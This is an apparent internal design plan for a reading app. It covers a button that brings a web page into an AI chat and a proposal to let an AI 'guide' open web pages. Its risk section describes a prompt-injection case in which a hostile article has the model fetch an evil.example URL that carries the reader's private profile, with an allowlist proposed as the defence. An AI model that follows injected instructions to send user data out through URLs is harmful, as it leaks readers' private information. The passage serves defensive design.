# Bring a web page into Chat, and whether the guide may open pages

**Status:** stage 1 (1A) built on `dev`, 2026-10-17 (§ What landed). Stage 2 (2A) is planned here
in full and asked of Greg as [q-g492eq](../user-feedback/questions/q-g492eq.md), not built.
**Why:** Greg's reply `spya-eqtvhz` (2026-10-17 13:08 UTC) to
[q-madusw](../user-feedback/questions/q-madusw.md), about report `spya-vc6uzm`
(`SPIDERYARN-READING2-HY`), queue item `qi-jbfehgss`:

> 1A and 2A / Re guide: our approach should be that it prefers to hand off substantive work (e.g. by
> offering to create new Chat threads), but that it's not hobbled by lack of tools/capability/access
> if it tries to do things
>
> — Greg, 2026-10-17, reply `spya-eqtvhz` to q-madusw

- **1A**: a *Bring into this chat* button on each link of a search result and on a pasted address.
  Pressing it imports the page as the Add box does, then puts it in the composer as an @-mention,
  through the path plan [261012d](261012d-chat-at-mention-your-own-articles.md) built.
- **2A**: the guide may open a search result and read the page, as Chat can. That adds
  `read_web_page` to `toolsFor('guide')`, and a conversation's tool list is a listed defence
  ([security-map.md](../project/security-map.md), the `src/chat-tools.ts` row). An unattended run
  does not edit a defence on a reply alone, so 2A is planned here (§ Stage 2) and the build is asked
  of Greg in a new question.
- **The guide principle** (prefer handing off, never hobbled) is recorded in the doc that owns the
  guide, [chat-tools.md § The guide](../project/chat-tools.md#the-guide).

Prior work: [261012g](261012g-web-search-through-a-subagent-for-chat-and-the-guide.md) § Stage 3
named this exact seam ("a reader-pressed button that imports the page to the shelf through the
ingest queue, then puts it in the composer as a pending mention"); [261012d](261012d-chat-at-mention-your-own-articles.md)
is the mention path. Nothing of 1A exists on `origin/dev` as of `8052f3b78`.

## Stage 1 — 1A: *Bring into this chat*

### What the reader gets

```
 AI:  Three reviews disagree about the effect size …
      FROM THE WEB
      Smith 2024, Replication  ·  [⇣ Bring into this chat]
      A blog's critique        ·  [⇣ Bring into this chat]

 (pressed)
      Smith 2024, Replication  ·  Adding to your shelf…            ← a PDF says minutes
      Smith 2024, Replication  ·  ✓ In the box below                 ← chip added

 Bringing in: [Smith 2024, Replication ×]
 ┌──────────────────────────────────────────────┐
 │ compare with https://example.com/essay @Smith 2024, Replication │
 └──────────────────────────────────────────────┘
 [⇣ Bring example.com/essay into this chat]         ← the pasted address
```

- **Where the button is**:
  - on each row of *From the web* (`WebSources`, the provider search's sources under a Chat answer);
  - under the composer, one per web address in the draft (at most three, the mention cap), for an
    address the reader pasted or typed.
  - **Typed Chat only** (`kind: "chat"`), because only Chat takes mentions (261012d). Not the guide,
    Learn, Tutorial, Explore or the dialog's other kinds.
- **What pressing does**:
  1. `POST /api/jobs { url, ownCopy: true }` through `useJobs().add`, the same call the link hover
     card's *add to Spideryarn* makes (`WithAddToShelf` in `ProseHoverCard.tsx`). So the slot,
     deduplication and the 402 are the server's, as everywhere else.
  2. **Already on the shelf** → `200 { article }`, free: the chip is added at once.
  3. **The open article itself** → the button says so, and nothing is added (the server would
     refuse the mention).
  4. **A new import** → the button shows the job's progress; when the job is `done`, the chip is
     added. Not on `openEarly`: `admitMentions` refuses until a revision is published, so the
     button waits for `done`.
  5. **Refused** (no slots, a page we cannot read) → the server's sentence, read with
     `lastFailure()` straight after the await, and the button again only when `worthRetrying`
     says another go could help. **A failed job** → its error, and **no button**: another
     `POST /api/jobs` is a fresh add, not a retry of that job (Sol F3; the hover card's
     `describeAdd` made the same call).
- **The chip's title**, in order: a finished job's title; for a free repeat, the article's title
  off the shelf the `@` list reads (`loadMentionCandidates`); else the link's own words under an
  answer, else the address's host (Sol F4).
- **The chip, and the text**: `@Short title ` is appended to the end of the box, and the chip joins
  the *Bringing in* row exactly as a pick from the `@` picker does. The reader then asks their
  question; nothing is sent by the press.
- **Cost, said on the button**: its tooltip and accessible description say *"Adds the page to your
  shelf, which uses one article from your allowance, then brings it into this conversation."* An
  admin is exempt on the server, as for every add.

### Decisions, and the simpler options passed over

- **`ownCopy: true`, always.** A page someone else has made public would otherwise answer
  `{ publicCopy }` and offer the free copy, but Chat reads only the reader's own articles (261012d;
  widening that is a separate defence edit Greg has not asked for). So the press asks for the
  reader's own copy, which is what *Bring into this chat* needs. It still answers a repeat for the
  reader's own shelf first, free (`routes.ts` asks the shelf before `ownCopy`).
- **The press is remembered per address, for the tab** (a module map keyed on `urlKey`, as the
  hover card does), **and forgotten when the tab's reader changes** (`forgetOnReaderChange`, with a
  generation checked after every await), so reader B never sees reader A's job or slug (Sol F2). Switching thread or mode mid-import does not lose it: the job runs on (the job
  engine is tab-wide), and coming back finds the button at *On your shelf · Bring into this chat*,
  which adds the chip at once. **The chip is added automatically only by the button that was
  pressed, while it is still on screen**, so a chip never lands in a conversation the reader has
  since left.
- **How a button in the transcript reaches the composer**: the composer of the open thread
  registers an `add(mention)` function with the panel (a ref), and the transcript's buttons call it.
  The composer's own pasted-address buttons call it directly. No `useEffect` nonce, no store write:
  the composer already owns its row (`useMentionPicker`), and a second writer to the draft store
  is exactly the braid 261012d's round 2 (R2-3) untangled.
  - The add respects the per-question cap (`pickRefusal`) and returns its refusal, which the button
    shows. It reads the row as of the last write (a ref kept with `setPicked`), so two imports
    finishing in one render cannot both pass the cap (Sol F1).
  - While a question with chips is on its way (`mentionWaiting`), the row is that question's and the
    draft keeps none, so the add is refused with a sentence to try again in a moment (Sol F1).
  - The hook gains `add({ slug, title })` beside `pick`; the `@` text goes at the end of the box,
    with `insertedAt` where it was written, so × takes it out again.
- **Not built in v1, each said here**:
  - a button on links inside an answer's prose, or on a guide's `search_web` links (the guide takes
    no mentions; a guide's link can be pasted into Chat, which then offers the button);
  - a button on a *sent* question that held an address (user messages are plain text, not linked;
    the reader can paste it again, and the repeat is free);
  - removing the article from the shelf afterwards: it is an ordinary article, archived or deleted
    the ordinary way.

### Tests, red first

- The pure state of a button (`describeBringIn`, beside `describeAdd`): every outcome above, the
  open article, a repeat, a refusal, a running and a failed job, and the cap.
- `pastedAddresses(draft)`: web addresses only, once each by `urlKey`, at most three, nothing for
  a bare word.
- The hook's `add`: the `@` text at the end with one space, the chip appended once, a fourth
  refused with the cap's sentence, and × after an add taking its text out.
- One component test: pressing a *From the web* row with a stubbed `POST /api/jobs` answering a
  repeat puts the chip in the composer's row.
- One browser pass (Sonnet subagent, Playwright on the box) at 1440 and 390: a repeat, a fresh web
  page import to `done`, a pasted address, the cap, and the open article.

## Stage 2 — 2A: the guide may open a page (planned, asked, not built)

### What changes

- `READ_WEB_PAGE` joins `GUIDE_TYPED_TOOLS` in [`src/chat-tools.ts`](../../src/chat-tools.ts):
  the typed guide only, not `GUIDE_TOOLS` (which Live is offered; Live is its own item).
- **Every check Chat's `read_web_page` has, unchanged**: the URL caps (`MAX_URL_QUERY_CHARS` 256 on
  the query and fragment, `MAX_URL_CHARS` 2,048 on the whole), the open article's own address
  refused, `fetchDocument`'s scheme check, private-address guard, redirect limit and size cap, no
  PDFs, 12,000 characters, the fence.
- **New for the guide, and stricter than Chat — an allowlist of exact addresses** (after Sol F5).
  The guide may open only an address it was handed, never one it composed:
  - a link the current turn's `search_web` returned (the subagent already keeps only links the
    search really returned);
  - an address in one of the reader's own messages in this conversation;
  - one of the open article's own links (`articleLinks`, the set chat-tools.md § Still open names
    as the allowlist's first input).

  Any other address is refused before a fetch, with a sentence telling the guide to offer
  *Ask in Chat* instead. This closes the exfiltration channel for the guide outright: a hostile
  article can no longer get data out by having the model write it into a URL's path or query,
  because no composed URL is fetched. That is the allowlist Chat itself still lacks
  ([chat-tools.md § Still open](../project/chat-tools.md#still-open)); the guide would get it first.
- **One read a turn** (`READ_WEB_PAGE_PER_TURN_GUIDE = 1`, Sol F6), a second refused before any
  fetch, as `search_web`'s third is. Raised to two only if the eval finds cases that need it.
- **The prompt** (`GUIDE_SYSTEM`, reworded per [prompting-guide.md](../project/prompting-guide.md)),
  carrying Greg's principle: the guide prefers to hand substantive work to Chat (its *Ask in Chat*
  step); it may open a page when that answers a question about how to read this piece — is this
  review fair to it, what does the author's other piece say about it — and a search result's
  sentence is not enough. It never says it cannot open pages. It still answers inside its length
  rule.
- **Docs**: chat-tools.md (§ The eleven, § The guide, § Security), and security-map.md's
  `src/chat-tools.ts` row names the guide's page-reading and its cap.

### What it risks, said plainly

- **Without the allowlist it would be a new outbound channel.** Today the guide's only outbound
  text is a `search_web` query (two a turn, 300 characters). A GET is an outbound request: a
  hostile article could tell the guide to read `https://evil.example/<the reader's About you>`,
  up to 2,048 characters, path included, on top of its two searches. The guide holds the reader's
  reason and *About you* every turn. Chat has that exposure today. The allowlist above is why 2A
  does not give it to the guide: an address the search engine returned, the reader typed or the
  article's author wrote cannot carry what the model read this turn.
- **What remains**: a page the guide opens is a stranger's text, fenced, as in Chat; and the
  search query itself is still a 300-character channel, unchanged by 2A.
- **Cost and latency** (Sol F6): a page adds up to 12,000 characters and up to 20 seconds, in a
  conversation whose answers are meant to be short. One read a turn bounds it; the eval measures it.
- **Drift from its job.** Mitigated by the prompt and measured by the eval below.

### How it is checked

- Tests: the guide's tool list includes it (typed) and Live's does not
  (`tests/guide-tool-gate.test.ts`); a composed address (one not in the three sets) is refused
  unfetched, including one that differs from an allowed link only in its query; a second read in a
  turn is refused unfetched; the existing `read_web_page` tests run for a guide context; Chat's
  behaviour is unchanged.
- The guide eval ([`evals/guide/run.ts`](../../evals/guide/run.ts)), before and after: the
  how-to-read targets that read a page, the content-question controls that should still hand off
  to Chat with no read, answer length, and (Sol F6) how often it reads, the time to the answer,
  tool rounds and input tokens per turn.
- Sol on the plan and the code, as for every change.

### The question to Greg

A new file, `q-…`: may an unattended agent build 2A as planned here — Chat's checks, plus the
allowlist of handed addresses and one read a turn — with Sol reviewing the plan and the code?
Recommendation: yes. The question says plainly what the allowlist gives up: the guide cannot open
a page it found any other way (a link inside a page it read, an address it guessed), and offers
Chat for those instead. q-madusw is marked
answered (`acted: spya-eqtvhz`), since the 2A follow-up is a different question.

## Stages

1. **1A, client** (one commit, then Sol's code review and its fixes):
   `src/web/bring-in.ts` (pure: `describeBringIn`, `pastedAddresses`),
   `src/web/BringIntoChat.tsx` (the button and its import), `useMentionPicker().add`,
   `Composer` and `WebSources` wiring in `ChatPanel.tsx`, CSS, tests; the browser pass.
2. **Docs and bookkeeping**: chat-tools.md (§ Bringing in…, the guide principle in § The guide),
   web-client.md if it lists the new files, this plan's § What landed; the new question file;
   q-madusw answered; the report's note; `feedback-endings.ts`.

## Reviews

- **Sol plan review** ([prompt](261017e-plan-review-prompt.md),
  [answer](261017e-plan-review-sol.md)): *no P0*; three P1s for 1A and two findings on stage 2.
  All checked against the code and taken:
  - F1, the cap read from the row's latest write, and no add while a question is on its way;
  - F2, the reader-change fence, with a test;
  - F3, no button on a failed job (the plan had said otherwise; the code already did this);
  - F4, the chip title's order, with the shelf's title for a repeat rather than the host;
  - F5, the guide's real boundary: up to 2,048 characters, path included, and four outbound
    actions a turn with search. Taken further than Sol's either/or: the allowlist of handed
    addresses, which removes the composed URL altogether;
  - F6, one read a turn, and the eval measures time, rounds and tokens.
  - Sol confirmed: waiting for the import job's `done` is right (the stand-in revision publishes
    with it, and `admitMentions` accepts it); `ownCopy: true` is right; 1A edits no listed
    defence.
- **Sol code review** ([prompt](261017e-code-review-prompt.md), [diff](261017e-code-review.diff),
  [answer](261017e-code-review-sol.md)), write-capable: *no P0*, and it fixed what it found
  (`f3bd4ca26`). Checked and kept:
  - two buttons for one address (or two quick presses) could POST twice: every button for an
    address now shares the tab's record and is woken by it, and a press on a stale `offer` joins
    the import in flight instead of starting another;
  - an import could start, and spend a slot, with the row already full or a question with chips on
    its way: `BringIn.refusal()` is asked before the POST;
  - the row is read at its last write everywhere in `useMentionPicker` (pick, add, remove, edit,
    send), not only in `add`, so a chip taken out and an import finishing in one render cannot
    bring the chip back;
  - a free repeat of an unread paper (`processing: "minimal"`) would have made a chip the send
    then refused: it now says to open it and choose *Read this*;
  - a finished job is written into the record, so a job that later leaves the engine's list does
    not turn *Added* back into *Adding…*;
  - the composer clears the seam only if it still owns it.
  - One change after it: the source buttons' accessible name starts with the visible words
    (*Bring into this chat: Title*), so a voice command that says what is on the button finds it.

## What landed

- **Stage 1**: `0d10b7ea2` (the feature), `f3bd4ca26` (Sol's fixes). Files:
  [`src/web/bring-in.ts`](../../src/web/bring-in.ts), [`src/web/BringIntoChat.tsx`](../../src/web/BringIntoChat.tsx),
  `useMentionPicker().add` / `addRefusal` in [`MentionPicker.tsx`](../../src/web/MentionPicker.tsx),
  `withMentionAtEnd` in [`mentions.ts`](../../src/web/mentions.ts), and in
  [`ChatPanel.tsx`](../../src/web/ChatPanel.tsx) the composer's hand-over (`bringIn`, registered on
  `Conversation`'s `bringInTo` ref), its pasted-address row, and `WebSources`' buttons. Tests:
  `tests/bring-in.test.ts`, `tests/bring-into-chat.test.tsx`; each guard was seen to fail with its
  line removed (`ownCopy`, the guide's box, the row read at render, the reader-change fence).
- **Departure from § Stage 1**: a free repeat looks its title up on the shelf the `@` list reads,
  rather than falling back to the host — which also tells an unread paper apart (Sol).
- **Stage 2**: not built; asked as q-g492eq. Greg's principle is in
  [chat-tools.md § The guide](../project/chat-tools.md#the-guide).
